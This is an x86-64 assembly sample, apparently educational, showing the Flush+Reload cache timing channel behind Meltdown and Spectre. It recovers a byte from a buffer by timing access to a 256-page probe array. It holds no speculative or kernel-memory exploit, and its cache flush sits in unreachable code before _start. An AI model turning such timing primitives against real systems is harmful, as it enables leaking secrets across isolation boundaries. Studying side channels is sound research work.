bits 64

;   Meltdown and Spectre - Samples Written in Assembly
;   Copyright (C) 2018 U. Plonus
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.

     global         _start
     pspower        equ 12
     pagesize       equ 1 << pspower

section .rodata
     slf:           db 0x0a
     sreadbyte:     db "Byte read via cache access:     ",0x00
     ssountbyte:    db "Count of bytes with min timing: ",0x00
     sexpectedbyte: db "Expected byte from data:        ",0x00

section .bss
     alignb         pagesize
     data:          resb pagesize
     alignb         pagesize
     probe          times 256 resb pagesize
     scratch:       resb 32
     timings        resq 256

section .text
     mov       RDI,probe
     mov       RSI,pagesize
     call      _clearcache
_start:
     mov       RDI,data
     mov       RSI,pagesize
     rdtsc
     mov       EDX,EAX
     call      _xorshift
     mov       RDI,probe
     mov       RSI,pagesize
     shl       RSI,8
     rdtsc
     mov       EDX,EAX
     call      _xorshift
     mov       RDI,data
     xor       RAX,RAX
     mov       AL,[RDI]
     mov       RDX,pagesize
     mul       RDX
     mov       RSI,probe
     mov       AL,[RSI+RAX]
     mov       RDI,probe
     mov       RSI,pagesize
     mov       RDX,timings
     call      _readcachetiming
     mov       RDI,timings
     call      _analyzecachetiming
     push      RAX
     mov       RDI,sreadbyte
     call      _print
     pop       RDI
     push      RDI
     and       RDI,0xff
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
     mov       RDI,ssountbyte
     call      _print
     pop       RDI
     shr       RDI,8
     and       RDI,0xff
     mov       RSI,scratch
     call      _printdu64bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
     mov       RDI,sexpectedbyte
     call      _print
     mov       RSI,data
     xor       RAX,RAX
     mov       AL,[RSI]
     mov       RDI,RAX
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
     xor       RDI,RDI
     mov       RAX,60
     syscall

_clearcache:
     mov       RCX,256
     cld
.nextflush:
     clflush   [RDI]
     add       RDI,RSI
     loop      .nextflush
     lfence
     ret

_calccachetime:
     lfence
     rdtsc
     shl       RDX,32
     add       RAX,RDX
     mov       R8,RAX
     mov       RCX,[RDI]
     lfence
     rdtsc
     shl       RDX,32
     add       RAX,RDX
     sub       RAX,R8
     ret

_readcachetiming:
     push      RBP
     mov       RBP,RSP
     sub       RSP,32
     mov       [RBP-8],RDI
     mov       [RBP-16],RSI
     mov       [RBP-24],RDX
     mov       RCX,256
.nextcacheread:
     mov       [RBP-32],RCX
     call      _calccachetime
     mov       RDX,[RBP-24]
     mov       [RDX],RAX
     add       RDX,8
     mov       [RBP-24],RDX
     mov       RDI,[RBP-8]
     add       RDI,[RBP-16]
     mov       [RBP-8],RDI
     mov       RCX,[RBP-32]
     loop      .nextcacheread
     mov       RSP,RBP
     pop       RBP
     ret

_analyzecachetiming:
     push      RDI
     mov       R8,0xffffffffffffffff
     xor       RCX,RCX
     mov       RSI,RDI
.nextmin:
     lodsq
     cmp       RAX,R8
     ja        .nonewmin
     mov       R8,RAX
.nonewmin:
     inc       RCX
     cmp       RCX,256
     jb        .nextmin
     mov       RAX,R8
     shr       RAX,4
     add       R8,RAX
     pop       RSI
     xor       RCX,RCX
     xor       R9,R9
.nextbyte:
     lodsq
     cmp       RAX,R8
     ja        .nonewbyte
     inc       R9
     mov       R10,RCX
.nonewbyte:
     inc       RCX
     cmp       RCX,256
     jb        .nextbyte
     mov       RAX,R9
     shl       RAX,8
     mov       AL,R10b
     ret

_xorshift:
     cld
     mov       RCX,RSI
     shr       RCX,2
     mov       EAX,EDX
.next_random:
     mov       EBX,EAX
     shl       EAX,13
     xor       EAX,EBX
     mov       EBX,EAX
     shr       EAX,17
     xor       EAX,EBX
     mov       EBX,EAX
     shl       EAX,5
     xor       EAX,EBX
     stosd
     loop      .next_random
     ret

_nprint:
     mov       RDX,RDI
     mov       RDI,1
     mov       RAX,1
     syscall
     ret

_print:
     cld
     xor       AL,AL
     mov       RSI,RDI
.next_char:
     scasb
     jne       .next_char
     sub       RDI,RSI
     call      _nprint
     ret

_printdu64bit:
     mov       RAX,RDI
     mov       RDI,RSI
     mov       R8,RDI
     mov       RCX,10
     cld
.next:
     cmp       RAX,0
     je        .done
     xor       RDX,RDX
     div       RCX
     xchg      RDX,RAX
     add       AL,'0'
     stosb
     mov       RAX,RDX
     jmp       .next
.done:
     cmp       RDI,RSI
     jne       .printout
     mov       AL,'0'
     stosb
.printout:
     mov       RDX,RDI
     sub       RDX,RSI
     dec       RDI
.reverse:
     mov       AL,[RSI]
     mov       AH,[RDI]
     mov       [RSI],AH
     mov       [RDI],AL
     dec       RDI
     inc       RSI
     cmp       RSI,RDI
     jb        .reverse
     mov       RSI,R8
     mov       RDI,RDX
     call      _nprint
     ret

_printh8bit:
     xor       RAX,RAX
     mov       AX,DI
     xor       AH,AH
     mov       R8,RAX
     mov       RDI,RSI
     cld
     shr       AL,4
     and       AL,0x0f
     call      .printh4bit
     mov       RAX,R8
     and       AL,0x0f
     call      .printh4bit
     mov       RDI,2
     call      _nprint
     ret
.printh4bit:
     cmp       AL,10
     jae       .printa2f
     add       AL,'0'
     jmp       .printout
.printa2f:
     sub       AL,10
     add       AL,'a'
.printout:
     stosb
     ret
